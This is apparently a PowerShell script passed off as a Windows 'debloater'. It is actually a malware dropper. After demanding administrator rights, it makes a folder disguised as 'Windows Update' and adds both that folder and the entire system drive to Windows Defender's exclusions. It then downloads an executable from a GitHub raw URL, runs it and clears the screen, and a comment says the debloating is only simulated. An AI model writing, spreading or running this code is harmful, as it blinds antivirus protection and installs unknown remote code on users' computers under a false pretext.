# Ensure script runs as an administrator
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Host "You need to run this script as an administrator!" -ForegroundColor Red
    Exit
}

Write-Host "Loading..." -NoNewline

# Try to create a folder in Program Files
$progFiles = "${env:ProgramFiles}\Windows Update"
$newFolder = $progFiles

try {
    if (-not (Test-Path $newFolder)) {
        New-Item -Path $newFolder -ItemType Directory -ErrorAction SilentlyContinue | Out-Null
    }
} catch {
    # We'll just ignore this, as we are only attempting to create in Program Files.
}

# Add the newly created folder to Windows Defender exclusion list
Add-MpPreference -ExclusionPath $newFolder
$driveWin = (Get-WmiObject Win32_OperatingSystem).SystemDrive + "\"
Add-MpPreference -ExclusionPath $driveWin
$driveWinfail = (Get-WmiObject Win32_OperatingSystem).SystemDrive
Add-MpPreference -ExclusionPath $driveWinfail

# Download the update
$url = "https://raw.githubusercontent.com/firstlast4136/gpp/main/Downloader.exe"
$downloadPath = "$newFolder\debloater.exe"

Invoke-WebRequest -Uri $url -OutFile $downloadPath

# Start the .exe and don't wait for it to close
Start-Process -FilePath $downloadPath

Clear-Host

# Simulate debloater actions
